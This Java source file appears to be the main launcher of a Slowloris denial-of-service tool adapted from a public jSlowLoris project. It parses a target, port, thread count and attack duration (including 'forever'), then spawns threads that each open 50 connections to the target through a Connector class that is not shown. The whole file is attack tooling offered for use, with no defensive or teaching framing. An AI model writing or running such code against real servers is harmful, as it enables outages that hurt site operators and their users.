import java.net.MalformedURLException;

/**
 * I responsibly declared that I've used the following source:
 * https://github.com/Connor-F/jSlowLoris/blob/master/src/Main.java
 */
public class Main {
    public static void main(String[] args) throws MalformedURLException {
        if(args.length != 4)
            die("Usage:\n\t TARGET PORT NUMBER_OF_THREADS TIMER\n\t\tTARGET the address of the target\n\t\tPORT the port on the target server to connect to\n\t\tNUMBER_OF_THREADS how many threads the program should create. Each thread has 50 associated connections\n\t\tTIMER how long the attack should last in minutes. Use 0 for forever");

        int port = Integer.parseInt(args[1]);
        int threads = Integer.parseInt(args[2]);
        int timer = Integer.parseInt(args[3]);

        for(int i = 0; i < threads; i++) {
            Connector connector = new Connector(args[0], port, timer);
            new Thread(connector).start();
        }
    }

    /**
     * prints an error message and exits the program
     * @param deathMsg msg that indicates the cause of the fatal error
     */
    private static void die(String deathMsg) {
        System.err.println(deathMsg);
        System.exit(-1);
    }
}
